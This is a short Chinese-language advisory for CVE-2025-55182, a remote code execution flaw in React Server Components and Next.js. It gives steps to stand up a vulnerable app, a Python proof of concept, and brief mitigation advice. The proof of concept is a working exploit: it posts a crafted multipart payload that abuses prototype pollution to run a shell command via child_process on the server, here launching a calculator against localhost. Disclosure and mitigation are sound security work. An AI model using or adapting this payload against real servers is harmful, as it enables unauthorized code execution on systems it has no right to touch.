# CVE-2025-55182

React Server Components存在远程代码执行漏洞，攻击者可以通过构造恶意请求，在服务器端执行任意代码。由于Next.js等框架内置了React Server Components，攻击者也可以利用这个漏洞对相应框架进行攻击。

https://www.cve.org/CVERecord?id=CVE-2025-55182

## 有漏洞Next.js环境搭建
```bash
npx create-next-app@15.0.4 my-app --yes
cd my-app
npm run dev
```

## poc
https://github.com/ejpir/CVE-2025-55182-research

```python
import requests

# 构造 multipart/form-data 数据
files = {
    '0': (None, '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"process.mainModule.require(\'child_process\').execSync(\'xcalc\');","_formData":{"get":"$1:constructor:constructor"}}}'),
    '1': (None, '"$@0"')
}

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
    'Next-Action': 'x'
}

# 发送 POST 请求
response = requests.post('http://localhost:3000/', files=files, headers=headers)

# 输出响应
# print("Status Code:", response.status_code)
# print("Response Body:\n", response.text)
```

## 缓解
使用 `npm audit` 检查项目依赖，根据提示及时更新有安全漏洞的依赖。  
如果不能更新，尽量控制访问来源(如前置的身份认证)。  
如果部署了防火墙，除了增加相应检测规则外，建议配置只允许可信IP访问、限制IP地域。
